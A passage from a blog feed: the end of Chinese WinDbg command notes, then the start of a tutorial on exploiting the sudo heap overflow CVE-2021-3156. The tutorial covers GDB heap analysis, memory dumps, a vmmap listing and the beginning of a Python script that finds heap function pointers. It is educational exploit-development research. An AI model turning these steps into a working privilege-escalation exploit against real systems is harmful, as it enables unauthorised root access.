src="https://img.joe1sn.top/uploads/big/c944970e445234b7684674786c53c0a7.png" alt="image-20220609201202279" /></p><p>伪寄存器<code>@$ra</code>表示当前函数返回地址，那么<code>pa @$ra</code>则表示跳出当前函数</p><h1 id="断点命令"><a class="markdownIt-Anchor" href="#断点命令"></a> 断点命令</h1><h2 id="1对于int-3"><a class="markdownIt-Anchor" href="#1对于int-3"></a> 1.对于<code>int 3</code></h2><p>分别是<code>bp bu bm</code></p><ul><li><p><code>bp[ID] [选项] [地址or符号[要忽略的中断次数]] [中断时执行的命令]</code></p><p>选项：<code>/l</code> 一次性断点；<code>/c</code>最大调用深度；<code>/C</code>最小调用深度</p></li><li><p><code>bu kernel32!GetVersion</code>：对符号下断点</p></li><li><p><code>bu kernel32!GetVersio*</code>：对包含通配符下断点</p></li></ul><p><img src="D:%5CPictures%5Ctypora%5Cimage-20220609202028555.png" alt="image-20220609202028555" /></p><p><img src="https://img.joe1sn.top/uploads/big/128698d2d1b65f7e76d109b784cbeda4.png" alt="image-20220609203322923" /></p><h2 id="2硬件断点"><a class="markdownIt-Anchor" href="#2硬件断点"></a> 2.硬件断点</h2><p><code>ba[ID] 访问方式 访问长度 [选项] [断点地址or符号[忽略中断次数]] [终端执行指令]</code></p><ul><li>访问方式<ul><li>e：读取或执行时触发</li><li>r：读取时触发</li><li>w：写入时触发</li><li>i：在执行输入输出时触发</li></ul></li></ul><h2 id="3条件断点"><a class="markdownIt-Anchor" href="#3条件断点"></a> 3.条件断点</h2><p>建议用到的时候百度</p><p><img src="https://img.joe1sn.top/uploads/big/a4a966dcb6ea39081c68493833774e89.png" alt="image-20220609203950271" /></p><h2 id="4管理断点"><a class="markdownIt-Anchor" href="#4管理断点"></a> 4.管理断点</h2><p><code>bl</code>：列出所有断点</p><p><code>bc bd be</code>：删除 禁止 启用断点</p><h1 id="栈窗口"><a class="markdownIt-Anchor" href="#栈窗口"></a> 栈窗口</h1><p><img src="https://img.joe1sn.top/uploads/big/e8733ff215ccf23bb4a204a1b31d4b19.png" alt="image-20220609204833953" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:000:x86&gt; k</span><br><span class="line"> # ChildEBP RetAddr</span><br><span class="line">00 0019ff3c 0040112e esp+0x115e</span><br><span class="line">01 0019ff54 00401097 esp+0x112e</span><br><span class="line">02 0019ff64 00401009 esp+0x1097</span><br><span class="line">03 0019ff80 77037a7e esp+0x1009</span><br><span class="line">04 0019ffdc 77037a4e ntdll_76fd0000!__RtlUserThreadStart+0x2f</span><br><span class="line">05 0019ffec 00000000 ntdll_76fd0000!_RtlUserThreadStart+0x1b</span><br></pre></td></tr></table></figure><p>每一行都是当前线程的一个栈帧，00~05是站的调用链，从当前到顶层。</p><p>第一列是基地址(ChildEBP)；第二列是返回地址；第三列是函数的执行地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:000:x86&gt; kb</span><br><span class="line"> # ChildEBP RetAddr  Args to Child              </span><br><span class="line">00 0019ff3c 0040112e 00000008 00000007 00000006 esp+0x115e</span><br><span class="line">01 0019ff54 00401097 00000004 00000003 0019ff80 esp+0x112e</span><br><span class="line">02 0019ff64 00401009 00000002 00000001 7681fa29 esp+0x1097</span><br><span class="line">03 0019ff80 77037a7e 002f5000 f602b8bf 00000000 esp+0x1009</span><br><span class="line">04 0019ffdc 77037a4e ffffffff 77058a01 00000000 ntdll_76fd0000!__RtlUserThreadStart+0x2f</span><br><span class="line">05 0019ffec 00000000 00401000 002f5000 00000000 ntdll_76fd0000!_RtlUserThreadStart+0x1b</span><br></pre></td></tr></table></figure><p>kb会显示栈上面的前3个参数</p><ul><li><code>kp</code> ：参数和参数值按函数原型显示</li><li><code>kv</code>：相对于kp增加帧指针省略信息和调用约定显示</li><li><code>kd</code>：列出栈中的数据</li></ul><h1 id="内存命令"><a class="markdownIt-Anchor" href="#内存命令"></a> 内存命令</h1><h2 id="1查看内存"><a class="markdownIt-Anchor" href="#1查看内存"></a> 1.查看内存</h2><p><code>d[类型] [地址范围]</code></p><p>dw：DWORD<br />dd：4字节DWORD<br />dp：8字节<br />df：4字节单精度浮点<br />dp：指针大小格式<br />da：ASCII字符串<br />db：字节和ASCII字符串<br />ds：ANSI_STRING</p><p><code>dt [模块名!]类型名</code>：显示数据类型和数据结构</p><p><img src="https://img.joe1sn.top/uploads/big/4334bb5e719fc14b63b9e0f1a7c145b4.png" alt="image-20220610105504772" /></p><h2 id="2搜索内存"><a class="markdownIt-Anchor" href="#2搜索内存"></a> 2.搜索内存</h2><p><code>s - [type] range pattern</code></p><ul><li>type：搜索的数据类型：<code>b(byte) w(word) d(dword) a(ASCII) u(Unicode)</code></li><li>range：<ul><li>起始地址与终止地址  <code>s -a 0x4000000 0x4030000 &quot;test&quot;</code></li><li>起始地址和搜索长度  <code>s -a 0x0000000 L?0x7fffffff &quot;mytest&quot;</code></li></ul></li></ul><p><img src="https://img.joe1sn.top/uploads/big/eb26bb607e46d5b1ebd5ae3d427bc535.png" alt="image-20220610105541940" /></p><h2 id="3修改内存"><a class="markdownIt-Anchor" href="#3修改内存"></a> 3.修改内存</h2><p><code>e &#123;a|u|za|zu&#125; address &quot;String&quot;</code><br /><code>e &#123;a|b|d|D|f|q|u|w&#125; address [value]</code></p><h2 id="4观察内存属性"><a class="markdownIt-Anchor" href="#4观察内存属性"></a> 4.观察内存属性</h2><p><code>!address [Address]</code></p><h1 id="脚本"><a class="markdownIt-Anchor" href="#脚本"></a> 脚本</h1><p>winDBG可以像python一样解释执行脚本中的语言</p><h2 id="1伪寄存器"><a class="markdownIt-Anchor" href="#1伪寄存器"></a> 1.伪寄存器</h2><ul><li><code>@$exentry</code>：当前进程的入口，<code>g @$exentry</code>可以直达入口</li><li><code>$ip</code>：指令指针寄存器</li><li><code>$ra</code>：当前函数返回地址</li><li><code>$retreg</code>：函数返回值</li><li><code>$csp</code>：当前栈指针(current stack pointer)</li></ul><p><img src="https://img.joe1sn.top/uploads/big/40ef9cda6226e310e2ef728fc149c0aa.png" alt="image-20220610114849541" /></p><h2 id="其余建议百度"><a class="markdownIt-Anchor" href="#其余建议百度"></a> 其余建议百度</h2><h1 id="调试拓展功能"><a class="markdownIt-Anchor" href="#调试拓展功能"></a> 调试拓展功能</h1><p>类似于插件的加载</p><p><img src="https://img.joe1sn.top/uploads/big/35a3060f780589baa66dea1d56421d1d.png" alt="image-20220610115012875" /></p><p>开发的话可以参考WinDbg提供的sdk（在安装文件夹下就有）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;准备点windows基础功&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="dbg" scheme="https://joe1sn.eu.org/tags/dbg/"/>
    
    <category term="Windows" scheme="https://joe1sn.eu.org/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>SUDO堆溢出提权：从fuzz到exp [3]</title>
    <link href="https://joe1sn.eu.org/2022/04/14/sudo-fuzz2exp-3/"/>
    <id>https://joe1sn.eu.org/2022/04/14/sudo-fuzz2exp-3/</id>
    <published>2022-04-13T23:40:53.000Z</published>
    <updated>2023-06-01T14:24:18.025Z</updated>
    
    <content type="html"><![CDATA[<p>前文：<a href="https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/">https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/</a></p><p>受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程</p><p>原始视频合集：<a href="https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx">https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx</a></p><p>原始Blog：<a href="https://liveoverflow.com/why-pick-sudo-research-target-part-1/">https://liveoverflow.com/why-pick-sudo-research-target-part-1/</a></p><p>原作者代码仓库：<a href="https://github.com/LiveOverflow/pwnedit">https://github.com/LiveOverflow/pwnedit</a></p><span id="more"></span><blockquote><p>My previous blog: <a href="https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/">https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/</a></p><p>I was inspired by the LiveOverflow’s Sudo Vulnerability Walkthrough on youtube, but i found there’s no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this “from fuzz to exploit” series.</p><p>Original Videos: <a href="https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx">https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx</a></p><p>Original Blog: <a href="https://liveoverflow.com/why-pick-sudo-research-target-part-1/">https://liveoverflow.com/why-pick-sudo-research-target-part-1/</a></p><p>Source Project Code: <a href="https://github.com/LiveOverflow/pwnedit">https://github.com/LiveOverflow/pwnedit</a></p></blockquote><hr /><blockquote><p>本节内容：</p><p>Discussing Heap Exploit Strategies for sudo - Ep. 09</p><p>Developing a Tool to Find Function Pointers on The Heap | Ep. 10</p><p>Fuzzing Heap Layout to Overflow Function Pointers | Ep. 11</p><p>Developing GDB Extension for Heap Exploitation | Ep. 12</p></blockquote><h1 id="编写exp思路"><a class="markdownIt-Anchor" href="#编写exp思路"></a> 编写exp思路</h1><p>对于CTF中常见的堆思路是通过堆分配算法，使用<code>free</code>、<code>malloc</code>进行exp的编写，所以一般会出现一些菜单让你使用这些功能。<strong>本质上是攻击堆分配算法</strong></p><p>但是在漏洞利用中，只存在这一个堆溢出，我们无法进行系列的<code>free</code>、<code>malloc</code>，所以思路是能否攻击堆内的有效数据，尝试找到堆内的函数指针或者其他有用的数据。<strong>本质上是攻击堆上的数据</strong></p><h2 id="gdb调试"><a class="markdownIt-Anchor" href="#gdb调试"></a> GDB调试</h2><p>不适用asan重新编译后，使用<strong>GEF</strong>分析crash时堆的分布</p><p><img src="https://img.joe1sn.top/uploads/big/532a062a01ed40da463ddb63ede2b010.png" alt="image-20220414081956697" /></p><p>一个很明显的堆溢出，再看看出发时的堆分布</p><p>断点</p><p><img src="https://img.joe1sn.top/uploads/big/977a9e1186a3d96c3b29ef7214e2f822.png" alt="image-20220414082506061" /></p><p>堆chunk</p><p><img src="https://img.joe1sn.top/uploads/big/929d8e8804974a002194405514a80b0c.png" alt="image-20220414082234355" /></p><p><img src="https://img.joe1sn.top/uploads/big/cf2f151144da211172788131fd8df6bb.png" alt="image-20220414082408083" /></p><p>再次到达断点，堆溢出</p><p><img src="https://img.joe1sn.top/uploads/big/7da088de496daf242ff6f08f51273c77.png" alt="image-20220414083507789" /></p><h2 id="困难与解决"><a class="markdownIt-Anchor" href="#困难与解决"></a> 困难与解决</h2><p>这样的堆分配情况让我们很难使用堆风水去调整堆分配，并且在程序运行中会遇到各种何样的内存分配情况，哪怕是不一样的长度都会造成堆分配的不同，进而让数据分配到不同的地方。</p><p>如何解决，有两个思路</p><ul><li><p>作者收到了<a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">原文报告</a>的启发，尝试编写小工具去“控制”堆</p><blockquote><p>To implement this initial technique, we wrote a rudimentary brute-forcer<br />that executes Sudo inside gdb, overflows the “user_args” buffer, and<br />randomly selects the following parameters:</p></blockquote></li><li><p>通过覆写其他堆中的函数指针来实现rce或者提权</p></li></ul><h1 id="函数指针工具编写"><a class="markdownIt-Anchor" href="#函数指针工具编写"></a> 函数指针工具编写</h1><h2 id="思路分析"><a class="markdownIt-Anchor" href="#思路分析"></a> 思路分析</h2><p>从gdb的<code>vmmap</code>指令我们知道程序有哪些代码段</p><p><img src="https://img.joe1sn.top/uploads/big/aafecabf6b9432e4732b8135953de8fe.png" alt="image-20220414084942194" /></p><p>如果在堆内存中带有<code>x</code>即可执行权限的话就可能存在能够被我们利用的函数指针</p><h2 id="工具编写"><a class="markdownIt-Anchor" href="#工具编写"></a> 工具编写</h2><ol><li><p>写入但是没有溢出的情况下，在漏洞函数断点，dump内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dump binary memory /pwd/heap 0x005555555f9000 0x00555555637000</span><br></pre></td></tr></table></figure></li><li><p>复制<code>vmmap</code>结果，尝试分析出有可执行权限的内存地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">0x00555555554000 0x0055555555b000 0x00000000000000 r-- /pwd/sudo_test/src/sudo</span><br><span class="line">0x0055555555b000 0x005555555d6000 0x00000000007000 r-x /pwd/sudo_test/src/sudo</span><br><span class="line">0x005555555d6000 0x005555555f4000 0x00000000082000 r-- /pwd/sudo_test/src/sudo</span><br><span class="line">0x005555555f4000 0x005555555f5000 0x0000000009f000 r-- /pwd/sudo_test/src/sudo</span><br><span class="line">0x005555555f5000 0x005555555f9000 0x000000000a0000 rw- /pwd/sudo_test/src/sudo</span><br><span class="line">0x005555555f9000 0x00555555637000 0x00000000000000 rw- [heap]</span><br><span class="line">0x007ffff7cc1000 0x007ffff7d02000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7d02000 0x007ffff7d05000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span><br><span class="line">0x007ffff7d05000 0x007ffff7d0c000 0x00000000003000 r-x /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span><br><span class="line">0x007ffff7d0c000 0x007ffff7d0e000 0x0000000000a000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span><br><span class="line">0x007ffff7d0e000 0x007ffff7d0f000 0x0000000000b000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span><br><span class="line">0x007ffff7d0f000 0x007ffff7d10000 0x0000000000c000 rw- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span><br><span class="line">0x007ffff7d10000 0x007ffff7d16000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7d16000 0x007ffff7d1d000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache</span><br><span class="line">0x007ffff7d1d000 0x007ffff7d4f000 0x00000000000000 r-- /usr/lib/locale/C.UTF-8/LC_CTYPE</span><br><span class="line">0x007ffff7d4f000 0x007ffff7d51000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7d51000 0x007ffff7d73000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x007ffff7d73000 0x007ffff7eeb000 0x00000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x007ffff7eeb000 0x007ffff7f39000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x007ffff7f39000 0x007ffff7f3d000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x007ffff7f3d000 0x007ffff7f3f000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x007ffff7f3f000 0x007ffff7f43000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7f43000 0x007ffff7f45000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f45000 0x007ffff7f56000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f56000 0x007ffff7f5c000 0x00000000013000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f5c000 0x007ffff7f5d000 0x00000000019000 --- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f5d000 0x007ffff7f5e000 0x00000000019000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f5e000 0x007ffff7f5f000 0x0000000001a000 rw- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">0x007ffff7f5f000 0x007ffff7f65000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x007ffff7f65000 0x007ffff7f76000 0x00000000006000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x007ffff7f76000 0x007ffff7f7c000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x007ffff7f7c000 0x007ffff7f7d000 0x0000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x007ffff7f7d000 0x007ffff7f7e000 0x0000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x007ffff7f7e000 0x007ffff7f82000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7f82000 0x007ffff7f84000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span><br><span class="line">0x007ffff7f84000 0x007ffff7f99000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span><br><span class="line">0x007ffff7f99000 0x007ffff7fb3000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span><br><span class="line">0x007ffff7fb3000 0x007ffff7fb4000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span><br><span class="line">0x007ffff7fb4000 0x007ffff7fb5000 0x00000000031000 rw- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span><br><span class="line">0x007ffff7fb5000 0x007ffff7fbd000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7fbd000 0x007ffff7fbe000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span><br><span class="line">0x007ffff7fbe000 0x007ffff7fbf000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span><br><span class="line">0x007ffff7fbf000 0x007ffff7fc0000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span><br><span class="line">0x007ffff7fc0000 0x007ffff7fc1000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span><br><span class="line">0x007ffff7fc1000 0x007ffff7fc2000 0x00000000003000 rw- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span><br><span class="line">0x007ffff7fc2000 0x007ffff7fc4000 0x00000000000000 rw-</span><br><span class="line">0x007ffff7fca000 0x007ffff7fce000 0x00000000000000 r-- [vvar]</span><br><span class="line">0x007ffff7fce000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]</span><br><span class="line">0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-</span><br><span class="line">0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]</span><br></pre></td></tr></table></figure></li><li><p>编写python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">vmmap=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x00555555554000 0x0055555555b000 0x00000000000000 r-- /pwd/sudo_test/src/sudo</span></span><br><span class="line"><span class="string">0x0055555555b000 0x005555555d6000 0x00000000007000 r-x /pwd/sudo_test/src/sudo</span></span><br><span class="line"><span class="string">0x005555555d6000 0x005555555f4000 0x00000000082000 r-- /pwd/sudo_test/src/sudo</span></span><br><span class="line"><span class="string">0x005555555f4000 0x005555555f5000 0x0000000009f000 r-- /pwd/sudo_test/src/sudo</span></span><br><span class="line"><span class="string">0x005555555f5000 0x005555555f9000 0x000000000a0000 rw- /pwd/sudo_test/src/sudo</span></span><br><span class="line"><span class="string">0x005555555f9000 0x00555555637000 0x00000000000000 rw- [heap]</span></span><br><span class="line"><span class="string">0x007ffff7cc1000 0x007ffff7d02000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7d02000 0x007ffff7d05000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d05000 0x007ffff7d0c000 0x00000000003000 r-x /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d0c000 0x007ffff7d0e000 0x0000000000a000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d0e000 0x007ffff7d0f000 0x0000000000b000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d0f000 0x007ffff7d10000 0x0000000000c000 rw- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d10000 0x007ffff7d16000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7d16000 0x007ffff7d1d000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache</span></span><br><span class="line"><span class="string">0x007ffff7d1d000 0x007ffff7d4f000 0x00000000000000 r-- /usr/lib/locale/C.UTF-8/LC_CTYPE</span></span><br><span class="line"><span class="string">0x007ffff7d4f000 0x007ffff7d51000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7d51000 0x007ffff7d73000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7d73000 0x007ffff7eeb000 0x00000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7eeb000 0x007ffff7f39000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f39000 0x007ffff7f3d000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f3d000 0x007ffff7f3f000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f3f000 0x007ffff7f43000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7f43000 0x007ffff7f45000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f45000 0x007ffff7f56000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f56000 0x007ffff7f5c000 0x00000000013000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f5c000 0x007ffff7f5d000 0x00000000019000 --- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f5d000 0x007ffff7f5e000 0x00000000019000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f5e000 0x007ffff7f5f000 0x0000000001a000 rw- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11</span></span><br><span class="line"><span class="string">0x007ffff7f5f000 0x007ffff7f65000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f65000 0x007ffff7f76000 0x00000000006000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f76000 0x007ffff7f7c000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f7c000 0x007ffff7f7d000 0x0000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f7d000 0x007ffff7f7e000 0x0000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7f7e000 0x007ffff7f82000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7f82000 0x007ffff7f84000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span></span><br><span class="line"><span class="string">0x007ffff7f84000 0x007ffff7f99000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span></span><br><span class="line"><span class="string">0x007ffff7f99000 0x007ffff7fb3000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span></span><br><span class="line"><span class="string">0x007ffff7fb3000 0x007ffff7fb4000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span></span><br><span class="line"><span class="string">0x007ffff7fb4000 0x007ffff7fb5000 0x00000000031000 rw- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0</span></span><br><span class="line"><span class="string">0x007ffff7fb5000 0x007ffff7fbd000 0x00000000000000 rw-</span></span><br><span class="line"><span class="string">0x007ffff7fbd000 0x007ffff7fbe000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fbe000 0x007ffff7fbf000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fbf000 0x007ffff7fc0000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so</span></span><br><span class="line"><span class="string">0x007ffff7fc0000 